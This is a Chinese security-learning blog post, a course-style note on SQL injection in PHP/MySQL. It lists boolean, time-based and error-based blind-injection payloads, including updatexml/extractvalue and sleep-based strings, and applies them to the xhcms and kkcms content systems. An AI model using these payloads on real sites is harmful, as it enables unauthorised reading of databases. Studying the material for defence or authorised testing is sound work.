@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        web攻防笔记第44天 | FlowsecNagi's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">web攻防笔记第44天</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/xiaodi8/" class="post-tag">#xiaodi8</a>
+  
+    <a href="/tags/web%E6%94%BB%E9%98%B2/" class="post-tag">#web攻防</a>
+  
+
+
+          <span class="post-date">2023-07-11</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h3 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-number">1</span>、功能：数据查询<br>查询：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br><br>#<span class="hljs-number">2</span>、功能：新增用户，添加新闻等<br>增加：<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> news (字段名) <span class="hljs-keyword">VALUES</span> (数据)<br><br>#<span class="hljs-number">3</span>、功能：删除用户，删除新闻等<br>删除：<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>$id<br><br>#<span class="hljs-number">4</span>、功能：修改用户，修改文章等<br>修改：<br><span class="hljs-keyword">UPDATE</span> news <span class="hljs-keyword">SET</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h3><h4 id="原因：不能回显"><a href="#原因：不能回显" class="headerlink" title="原因：不能回显"></a><strong>原因：不能回显</strong></h4><p><strong>为了解决常规的联合查询注入不行的情况</strong></p>
+<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。</p>
+<p>我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>我们可以知道盲注分为以下三类：</p>
+<p><code>1、基于布尔的SQL盲注-逻辑判断</code></p>
+<p><code>regexp,like,ascii,left,ord,mid</code></p>
+<p><code>2、基于时间的SQL盲注-延时判断</code></p>
+<p><code>if,sleep</code></p>
+<p><code>3、基于报错的SQL盲注-报错回显</code></p>
+<p><code>floor，updatexml，extractvalue</code></p>
+<h5 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a><strong>延迟</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> sleep(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">7</span>,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br><span class="hljs-keyword">and</span> if(<span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pi&#x27;</span>,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a><strong>布尔</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">7</span>;<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pi&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(database(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;i&#x27;</span>;<br><span class="hljs-keyword">and</span> ord(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">112</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="报错"><a href="#报错" class="headerlink" title="报错"></a><strong>报错</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> version()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> datebase()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x5c</span>, (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure>
+
+<p>更多：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span>            #判断ro或ro...是否成立 <br><br>regexp <span class="hljs-string">&#x27;^xiaodi[a-z]&#x27;</span> #匹配xiaodi及xiaodi...等<br><br>if(条件,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)          #条件成立 返回<span class="hljs-number">5</span> 反之 返回<span class="hljs-number">0</span><br><br>sleep(<span class="hljs-number">5</span>)              #<span class="hljs-keyword">SQL</span>语句延时执行<span class="hljs-number">5</span>秒<br><br>mid(a,b,c)            #从位置b开始，截取a字符串的c位<br><br>substr(a,b,c)         #从位置b开始，截取字符串a的c长度<br><br><span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>)，database() #<span class="hljs-keyword">left</span>(a,b)从左侧截取a的前b位<br><br>length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>  #判断数据库database()名的长度<br><br>ord<span class="hljs-operator">=</span>ascii ascii(x)<span class="hljs-operator">=</span><span class="hljs-number">97</span> #判断x的ascii码是否等于<span class="hljs-number">97</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h3><p>PHP开发项目-输出结果&amp;开启报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#基于延时：都不需要<br><span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#基于布尔：有数据库输出判断标准（数据回显）<br><span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#基于报错：有数据库报错处理判断标准（容错处理）<br>注：代码中有`<span class="hljs-keyword">or</span> die(mysqli_error($con));`会报错回显<br><br><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">#测试<span class="hljs-keyword">delete</span>注入：（有无回显，有无报错）<br><br>删除（延迟）：<span class="hljs-number">1</span> <span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-keyword">or</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<br><br>删除（布尔）：<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">6</span>（无回显 无法判断注入）<br><br>删除（报错）：<span class="hljs-number">4</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> version),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h3><p>1、xhcms-insert报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and &#x27;<br></code></pre></td></tr></table></figure>
+
+<h4 id="黑盒注入思路"><a href="#黑盒注入思路" class="headerlink" title="黑盒注入思路"></a>黑盒注入思路</h4><p><strong>盲注：报错和延迟都可以</strong></p>
+<p><strong>1、报错：有可能会失败，需要看代码段有没有写那个报错的代码段</strong></p>
+<p><strong>2、延迟：大部分都可以，可不可以还要看一个条件：符号的问题，能不能注释闭合</strong></p>
+<p>2、kkcms-delete延时</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">or</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">or</span> if(ord(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">107</span>,sleep(<span class="hljs-number">2</span>),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>空格：%20</p>
+<p>若有单引号过滤，可用ASCII码替换</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/12/HTB-Responder/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>HTB-Responder</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/09/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC43%E5%A4%A9/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      web攻防笔记第43天
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">人</div><div class="matts">人</div><div class="matts">为</div><div class="matts">我</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">我</div><div class="matts">为</div><div class="matts">人</div><div class="matts">人</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:flow63681@gmail.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/ABCkillmen">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.freebuf.com/author/FlowsecNagi">Freebuf</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:flow63681@gmail.com">flow63681@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">FlowsecNagi's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
